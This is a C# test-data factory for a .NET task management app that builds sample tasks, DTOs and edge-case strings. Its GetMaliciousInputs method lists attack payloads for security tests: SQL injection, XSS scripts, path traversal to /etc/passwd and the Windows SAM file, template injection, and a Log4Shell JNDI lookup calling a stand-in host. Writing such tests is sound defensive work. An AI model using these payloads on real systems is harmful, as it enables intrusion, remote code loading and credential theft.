using AgenticTaskManager.Domain.Entities;
using AgenticTaskManager.Application.DTOs;

namespace TestUtilities;

/// <summary>
/// Factory class for creating test data objects with predefined values
/// </summary>
public static class TestDataFactory
{
    public static TaskItem CreateValidTaskItem(
        string? title = null,
        string? description = null,
        AgenticTaskManager.Domain.Entities.TaskStatus status = AgenticTaskManager.Domain.Entities.TaskStatus.New,
        Guid? createdById = null,
        Guid? assignedToId = null,
        DateTime? dueDate = null)
    {
        return new TaskItem
        {
            Id = Guid.NewGuid(),
            Title = title ?? "Test Task",
            Description = description ?? "Test Description",
            Status = status,
            CreatedById = createdById ?? Guid.NewGuid(),
            AssignedToId = assignedToId ?? Guid.NewGuid(),
            DueDate = dueDate ?? DateTime.UtcNow.AddDays(7),
            CreatedAt = DateTime.UtcNow
        };
    }

    public static TaskDto CreateValidTaskDto(
        string? title = null,
        string? description = null,
        Guid? createdById = null,
        Guid? assignedToId = null,
        DateTime? dueDate = null)
    {
        return new TaskDto
        {
            Title = title ?? "Test Task",
            Description = description ?? "Test Description",
            CreatedById = createdById ?? Guid.NewGuid(),
            AssignedToId = assignedToId ?? Guid.NewGuid(),
            DueDate = dueDate ?? DateTime.UtcNow.AddDays(7)
        };
    }

    public static TaskSearchParametersDto CreateValidSearchParams(
        string? apiKey = null,
        string? title = null,
        string? description = null)
    {
        return new TaskSearchParametersDto
        {
            ApiKey = apiKey ?? "valid-api-key",
            Title = title ?? "Test Task",
            Description = description ?? "Test Description",
            StartDate = DateTime.Now,
            EndDate = DateTime.Now.AddDays(1),
            AssignedTo = "user1",
            CreatedBy = "user2",
            Status = 1,
            Priority = 1
        };
    }

    public static List<TaskItem> CreateTaskList(int count = 3)
    {
        return Enumerable.Range(1, count)
            .Select(i => CreateValidTaskItem($"Task {i}", $"Description {i}"))
            .ToList();
    }

    /// <summary>
    /// Creates malicious input strings for security testing
    /// </summary>
    public static IEnumerable<string> GetMaliciousInputs()
    {
        return new[]
        {
            "'; DROP TABLE Tasks; --",
            "<script>alert('xss')</script>",
            "1' OR '1'='1",
            "UNION SELECT * FROM Users",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "\\\\server\\share\\file",
            "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "' UNION SELECT password FROM users WHERE '1'='1",
            "${7*7}",
            "{{7*7}}",
            "#{7*7}",
            "<%= 7*7 %>",
            "${jndi:ldap://malicious.com/a}"
        };
    }

    /// <summary>
    /// Creates edge case inputs for testing
    /// </summary>
    public static IEnumerable<object[]> GetEdgeCaseInputs()
    {
        return new[]
        {
            new object[] { "" },
            new object[] { "   " },
            new object[] { null! },
            new object[] { new string('a', 1000) }, // Very long string
            new object[] { "Special chars: !@#$%^&*()_+-=[]{}|;':\",./<>?" },
            new object[] { "Unicode: 测试 🌟 emojis" },
            new object[] { "\r\n\t" }, // Whitespace characters
            new object[] { "Zero width: ​‌‍" } // Zero-width characters
        };
    }
}
